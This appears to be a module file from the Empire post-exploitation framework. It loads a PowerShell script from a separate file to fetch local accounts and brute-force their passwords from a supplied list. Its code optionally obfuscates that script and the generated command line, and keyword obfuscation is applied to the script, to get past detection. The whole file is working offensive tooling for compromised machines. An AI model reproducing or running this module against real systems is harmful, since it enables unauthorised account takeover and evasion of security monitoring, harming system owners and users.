from __future__ import print_function

import pathlib
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        Passlist = params['Passlist']
        Verbose = params['Verbose']
        ServerType = params['ServerType']
        Loginacc = params['Loginacc']
        Loginpass = params['Loginpass']
        print(helpers.color("[+] Initiated using passwords: " + str(Passlist)))

        # if you're reading in a large, external script that might be updates,
        #   use the pattern below
        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/recon/Fetch-And-Brute-Local-Accounts.ps1"
        if main_menu.obfuscate:
            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
            if pathlib.Path(obfuscated_module_source).is_file():
                module_source = obfuscated_module_source

        try:
            with open(module_source, 'r') as f:
                module_code = f.read()
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code,
                                         obfuscationCommand=main_menu.obfuscateCommand)
        else:
            script = module_code

        script_end = " Fetch-Brute"
        if len(ServerType) >= 1:
            script_end += " -st "+ServerType
        script_end += " -pl "+Passlist
        if len(Verbose) >= 1:
            script_end += " -vbse "+Verbose
        if len(Loginacc) >= 1:
            script_end += " -lacc "+Loginacc
        if len(Loginpass) >= 1:
            script_end += " -lpass "+Loginpass

        if main_menu.obfuscate:
            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        print(helpers.color("[+] Command: " + str(script_end)))

        return script
